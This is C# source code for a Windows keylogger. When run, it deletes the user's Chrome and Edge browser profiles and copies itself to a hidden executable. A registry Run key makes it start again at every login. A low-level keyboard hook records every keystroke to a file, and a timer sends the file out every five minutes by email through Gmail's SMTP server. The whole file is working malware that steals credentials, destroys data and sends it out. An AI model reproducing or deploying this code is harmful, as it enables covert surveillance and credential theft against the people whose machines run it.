using System.Diagnostics;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Timers;
using System.Windows.Forms;



namespace KeyLogger
{

    class Program
    {

        //email and password
        private static string email = (@".................");
        private static string password = @"...................";




        private static string deePath = (@"C:\Users\" + Environment.UserName + @"\keylloger.exe");
        private static string path = @"C:\Users\" + Environment.UserName + @"\C0Ml123Tz.txt";


        private static IntPtr _hookID = IntPtr.Zero;
        private static readonly LowLevelKeyboardProc _proc = HookCallback;
        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;




        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);


        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);


        static void Main(string[] args)
        {
            Program p = new Program();
            p.start();


        }

        private void start()
        {


            var process = Process.GetCurrentProcess();
            string fullPath = process.MainModule.FileName;

            if (Directory.Exists(@"C:\Users\" + Environment.UserName + @"\AppData\Local\Google\Chrome\User Data\Default"))
            {
                Directory.Delete(@"C:\Users\" + Environment.UserName + @"\AppData\Local\Google\Chrome\User Data\Default", true);


            }

            if (Directory.Exists(@"C:\Users\" + Environment.UserName + @"\AppData\Local\Microsoft\Edge\User Data\Default"))
            {
                Directory.Delete(@"C:\Users\" + Environment.UserName + @"\AppData\Local\Microsoft\Edge\User Data\Default", true);
            }


            if (File.Exists(deePath) == false)
            {
                File.Copy(fullPath, deePath);
                File.SetAttributes(deePath, FileAttributes.Hidden);
            }

            const string HKCU = "HKEY_CURRENT_USER";
            const string RUN_KEY = @"SOFTWARE\\Microsoft\Windows\CurrentVersion\Run";

            Microsoft.Win32.Registry.SetValue(HKCU + "\\" + RUN_KEY, "AppName", deePath);

            System.Timers.Timer t = new System.Timers.Timer();
            t.AutoReset = true;
            t.Enabled = true;
            t.Interval = 300000;
            t.Elapsed += sendEmail;

            _hookID = SetHook(_proc);
            Application.Run();
            UnhookWindowsHookEx(_hookID);

        }
        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            {
                using (ProcessModule curModule = curProcess.MainModule)
                {
                    return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
                }
            }
        }

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);

                StreamWriter file = new StreamWriter(path, true);
                file.Write((Keys)vkCode);
                file.Close();
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        private static void sendEmail(Object source, ElapsedEventArgs e)
        {
            try
            {

                //const string HKCU = "HKEY_CURRENT_USER";
                //const string RUN_KEY = @"SOFTWARE\\Microsoft\Windows\CurrentVersion\Run";

                MailMessage mail = new MailMessage();
                SmtpClient server = new SmtpClient("smtp.gmail.com");
                mail.From = new MailAddress(email);
                mail.To.Add(email);
                server.Port = 587;
                server.Credentials = new NetworkCredential(email, password);
                server.EnableSsl = true;


                mail.Subject = "Record";
                StreamReader r = new StreamReader(path);
                String content = r.ReadLine();
                r.Close();
                File.Delete(path);
                mail.Body = content;


                server.Send(mail);

                //Thread.Sleep(300000);

                

            }
            catch (Exception ex)
            {
            }
        }



    }
}

